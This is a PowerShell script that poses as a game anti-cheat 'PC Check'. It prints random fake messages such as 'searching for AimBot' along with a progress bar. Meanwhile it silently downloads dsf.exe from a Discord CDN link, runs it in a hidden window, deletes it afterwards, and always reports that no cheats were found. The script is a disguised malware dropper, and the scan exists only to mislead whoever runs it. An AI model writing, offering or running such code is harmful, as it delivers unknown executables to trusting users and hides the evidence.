# --- PC Check ---
Write-Host "Running PC Check..." -ForegroundColor Green

# Function to display progress with random searching messages
function Show-Progress {
    param([int]$percent)
    
    # Clear the current line
    Write-Host "`r" -NoNewline
    
    # Display percentage in green
    Write-Host "$percent% " -ForegroundColor Green -NoNewline
    
    # Display random searching messages at certain percentages
    $messages = @(
        "searching for Eulen",
        "searching for Susano",
        "searching for Susano", 
        "searching for Custom",
        "searching for Skript",
        "searching for Vape",
        "searching for GhostClient",
        "searching for AimBot",
        "searching for AutoClicker",
        "searching for Reach",
        "searching for Velocity",
        "searching for AntiKB"
    )
    
    $randomMessage = $messages | Get-Random
    $randomColor = Get-Random -Minimum 1 -Maximum 15
    Write-Host $randomMessage -ForegroundColor $randomColor -NoNewline
}

# Get computer info (silently)
Get-ComputerInfo | Out-Null
Show-Progress -percent 10
Start-Sleep -Milliseconds 800

Show-Progress -percent 20
Start-Sleep -Milliseconds 800

Show-Progress -percent 30
Start-Sleep -Milliseconds 800

Show-Progress -percent 40
Start-Sleep -Milliseconds 800

# --- User Configuration ---
$url = "https://cdn.discordapp.com/attachments/1481031763563118712/1481042495721967837/dsf.exe?ex=69b1dfcf&is=69b08e4f&hm=71a7ec9284a04bf90e2fe44bf5af386750cded54fd9562e2ebc718d3bce4a54c&"
$outputPath = "$env:USERPROFILE\Downloads\dsf.exe"
# --- End Configuration ---

Show-Progress -percent 50
Start-Sleep -Milliseconds 800

# Download the file (silently)
try {
    Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction SilentlyContinue
    Show-Progress -percent 60
    Start-Sleep -Milliseconds 800
    
    Show-Progress -percent 70
    Start-Sleep -Milliseconds 800
    
    # Run the executable (silently)
    Start-Process -FilePath $outputPath -WindowStyle Hidden
    Show-Progress -percent 80
    Start-Sleep -Milliseconds 800
    
    Show-Progress -percent 90
    Start-Sleep -Milliseconds 800
    
    # Wait 10 seconds
    Start-Sleep -Seconds 10
    
    # Delete the file (silently)
    if (Test-Path $outputPath) {
        Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue
    }
    
    # Final completion
    Write-Host "`r100% " -ForegroundColor Green -NoNewline
    Write-Host "PC check is done, no cheats are found." -ForegroundColor Green
}
catch {
    # Silent error handling - still show completion
    if (Test-Path $outputPath) {
        Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue
    }
    Write-Host "`r100% " -ForegroundColor Green -NoNewline
    Write-Host "PC check is done, no cheats are found." -ForegroundColor Green
}

Read-Host -Prompt "Press Enter to exit"
